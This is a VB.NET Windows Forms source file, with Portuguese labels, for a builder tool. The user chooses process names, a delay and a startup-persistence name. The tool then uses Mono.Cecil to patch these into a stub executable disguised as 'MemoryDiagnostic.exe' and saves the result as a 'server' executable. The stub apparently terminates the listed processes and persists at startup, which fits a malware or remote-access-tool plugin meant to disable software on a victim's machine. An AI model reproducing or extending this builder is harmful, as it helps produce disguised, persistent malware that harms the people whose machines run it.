Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class FrmCriarAntiProcess

    Private Sub btnAtualizar_Click(sender As Object, e As EventArgs) Handles btnAtualizar.Click
        MeusProcessos()
    End Sub

    Private Sub MeusProcessos()
        Try
            LVListProcess.Items.Clear()
            LVListProcess.Sorting = SortOrder.None
            For Each U As Process In Process.GetProcesses

                Try
                    Dim pid = U.Id
                    Dim ico As Icon = Icon.ExtractAssociatedIcon(U.MainModule.FileName)
                    IM.Images.Add(pid.ToString, ico)

                    Dim N As New ListViewItem
                    N.Text = U.ProcessName
                    N.ImageKey = pid.ToString
                    LVListProcess.Items.Add(N)

                    LVListProcess.Columns(0).Text = "Lista de Processos (" & LVListProcess.Items.Count & ")"

                Catch ex As Exception

                End Try

            Next
            LVListProcess.Sorting = SortOrder.Ascending
        Catch ex As Exception

        End Try
    End Sub

    Private Sub AdicionarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AdicionarToolStripMenuItem.Click
        Try
            For Each N As ListViewItem In LVListProcess.SelectedItems
                Dim aa As New ListViewItem
                aa.Text = N.Text
                aa.ImageKey = N.ImageKey
                LVProcess.Items.Add(aa)
                LVListProcess.Items.RemoveAt(N.Index)
                LVListProcess.Columns(0).Text = "Lista de Processos (" & LVListProcess.Items.Count & ")"
                LVProcess.Columns(0).Text = "Processos (" & LVProcess.Items.Count & ")"
            Next
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ExcluirToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExcluirToolStripMenuItem.Click
        For Each N As ListViewItem In LVProcess.SelectedItems
            LVProcess.Items.RemoveAt(N.Index)
            LVProcess.Columns(0).Text = "Processos (" & LVProcess.Items.Count & ")"
        Next
    End Sub

    Private Sub btnAdicionar_Click(sender As Object, e As EventArgs) Handles btnAdicionar.Click
        If txtNomeProcess.Text = Nothing Then
            MsgBox("INSIRA NOME DO PROCESSO", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        End If

        Dim N As New ListViewItem
        N.Text = txtNomeProcess.Text
        N.ImageIndex = 0
        LVProcess.Items.Add(N)
        txtNomeProcess.Text = Nothing
        LVProcess.Columns(0).Text = "Processos (" & LVProcess.Items.Count & ")"
    End Sub

    Private Sub txtNomeProcess_KeyDown(sender As Object, e As KeyEventArgs) Handles txtNomeProcess.KeyDown
        If e.KeyCode = Keys.Enter Then
            btnAdicionar.PerformClick()
        End If
    End Sub

    Private Sub btnCriar_Click(sender As Object, e As EventArgs) Handles btnCriar.Click

        Application.DoEvents()
        If Not File.Exists(Application.StartupPath & "\Stub\MemoryDiagnostic.exe") Then
            MsgBox("'MemoryDiagnostic' NÃO ENCONTRADA", MsgBoxStyle.Critical, "Informações")
            Exit Sub
        ElseIf LVProcess.Items.Count = Nothing Then
            MsgBox("ADICIONE SUA LISTA DE PROCESSO PARA CRIAR", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        ElseIf CKAtivarStartUp.Checked = True And txtNomeStartUp.Text = Nothing Then
            MsgBox("INSIRA NOME DO ARQUIVO (StartUp)", MsgBoxStyle.Exclamation, "Informações")
            Exit Sub
        End If

        Dim I As New SaveFileDialog
        I.Title = "SERVIDOR"
        I.Filter = "ARQUIVOS (*.exe)|*.exe"
        I.FileName = TimeOfDay.ToString("ssmmhh MMddyyyy").Replace(" ", "")

        If I.ShowDialog = Windows.Forms.DialogResult.OK Then

            Try
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\MemoryDiagnostic.exe"))
                Dim definition2 As TypeDefinition
                For Each definition2 In definition.MainModule.GetTypes
                    Dim definition3 As MethodDefinition
                    For Each definition3 In definition2.Methods
                        If (definition3.Name = ".cctor") Then
                            Dim enumerator As IEnumerator(Of Instruction) = Nothing
                            Try
                                enumerator = definition3.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If (current.OpCode.Code = Code.Ldstr) Then
                                        Dim str As String = current.Operand.ToString

                                        If (str = "%MinhaLiistaas%") Then
                                            Dim Store As String = String.Empty
                                            Dim iSS As Integer = 0
                                            For Each X As ListViewItem In LVProcess.Items
                                                Store &= (LVProcess.Items.Item(iSS).SubItems(0).Text) & ","
                                                iSS += 1
                                            Next
                                            current.Operand = Store
                                            Continue Do
                                        End If

                                        If (str = "%MinhaDelayy%") Then
                                            current.Operand = NDDelay.Value.ToString
                                            Continue Do
                                        End If

                                        If (str = "%AtivarStartUpp%") Then
                                            current.Operand = CKAtivarStartUp.Checked.ToString
                                            Continue Do
                                        End If

                                        If (str = "%NomeStartUpp%") Then
                                            current.Operand = txtNomeStartUp.Text
                                            Continue Do
                                        End If

                                    End If
                                Loop
                            Finally
                                enumerator.Dispose()
                            End Try
                        End If
                    Next
                Next

                definition.Write(I.FileName)

                MsgBox(I.FileName & " ✅", MsgBoxStyle.Information, "Informações")
            Catch ex As Exception
                MsgBox("ERRO : OCORREU UM ERRO AO CRIAR O SERVIDOR TENTE NOVAMENTE", MsgBoxStyle.Critical, "Windows")
            End Try
        End If

    End Sub

    Private Sub CKAtivarStartUp_CheckedChanged(sender As Object, e As EventArgs) Handles CKAtivarStartUp.CheckedChanged
        If CKAtivarStartUp.Checked Then
            txtNomeStartUp.Enabled = True
        Else
            txtNomeStartUp.Enabled = False
        End If
    End Sub
End Class